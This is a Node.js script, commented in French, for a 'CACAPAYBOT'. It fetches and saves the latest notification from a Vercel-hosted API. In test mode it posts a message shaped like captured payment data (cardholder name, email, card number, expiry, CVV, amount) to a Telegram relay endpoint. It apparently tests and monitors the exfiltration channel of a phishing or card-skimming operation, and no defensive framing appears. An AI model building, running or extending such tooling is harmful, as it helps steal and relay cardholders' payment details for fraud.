const fetch = require('node-fetch');

console.log('📱 AFFICHAGE DU DERNIER MESSAGE CACAPAYBOT');
console.log('==========================================');

const CONFIG = {
    VERCEL_API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications',
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    LOG_FILE: 'last_message.txt'
};

// Fonction pour récupérer les messages depuis Vercel
async function getLastMessage() {
    try {
        console.log('🔍 Récupération des messages depuis Vercel...');
        const response = await fetch(CONFIG.VERCEL_API_URL);
        const data = await response.json();
        
        if (data.success && data.notifications && data.notifications.length > 0) {
            const lastMessage = data.notifications[0]; // Le plus récent
            console.log(`📨 ${data.notifications.length} messages trouvés`);
            return lastMessage;
        }
        return null;
    } catch (error) {
        console.error('❌ Erreur récupération messages:', error);
        return null;
    }
}

// Fonction pour afficher le message
function displayMessage(message) {
    console.log('\n' + '='.repeat(60));
    console.log('📱 DERNIER MESSAGE CACAPAYBOT');
    console.log('='.repeat(60));
    console.log(`🆔 ID: ${message.id}`);
    console.log(`📅 Date: ${new Date(message.timestamp).toLocaleString()}`);
    console.log(`👤 Expéditeur: ${message.sender}`);
    console.log(`📝 Type: ${message.type}`);
    console.log('\n📄 CONTENU:');
    console.log('-'.repeat(40));
    console.log(message.message);
    console.log('-'.repeat(40));
    console.log('='.repeat(60));
}

// Fonction pour sauvegarder le message dans un fichier
function saveMessageToFile(message) {
    const fs = require('fs');
    const content = `
=== DERNIER MESSAGE CACAPAYBOT ===
ID: ${message.id}
Date: ${new Date(message.timestamp).toLocaleString()}
Expéditeur: ${message.sender}
Type: ${message.type}

CONTENU:
${message.message}
=== FIN DU MESSAGE ===
`;
    
    try {
        fs.writeFileSync(CONFIG.LOG_FILE, content);
        console.log(`💾 Message sauvegardé dans: ${CONFIG.LOG_FILE}`);
    } catch (error) {
        console.error('❌ Erreur sauvegarde:', error);
    }
}

// Fonction pour envoyer un message de test
async function sendTestMessage() {
    try {
        console.log('🧪 Envoi d\'un message de test...');
        
        const testMessage = `💰 MESSAGE DE TEST AFFICHAGE !
👤 Nom: Test Display
📧 Email: test@display.com
💳 Carte: 1234 **** **** 5678
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 99.99€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: testMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Message de test envoyé !');
            console.log('⏳ Attente de 3 secondes...');
            
            // Attendre un peu pour que le message soit traité
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('❌ Erreur envoi message test:', error);
        return false;
    }
}

// Fonction principale
async function main() {
    const args = process.argv.slice(2);
    
    if (args.includes('--test')) {
        // Mode test - envoyer un message et l'afficher
        console.log('🧪 MODE TEST - Envoi et affichage d\'un message');
        const sent = await sendTestMessage();
        
        if (sent) {
            const message = await getLastMessage();
            if (message) {
                displayMessage(message);
                saveMessageToFile(message);
            } else {
                console.log('❌ Aucun message trouvé après l\'envoi');
            }
        }
    } else {
        // Mode normal - afficher le dernier message
        const message = await getLastMessage();
        
        if (message) {
            displayMessage(message);
            saveMessageToFile(message);
        } else {
            console.log('📭 Aucun message trouvé');
            console.log('💡 Utilisez --test pour envoyer un message de test');
        }
    }
}

// Exécuter
main().catch(console.error);
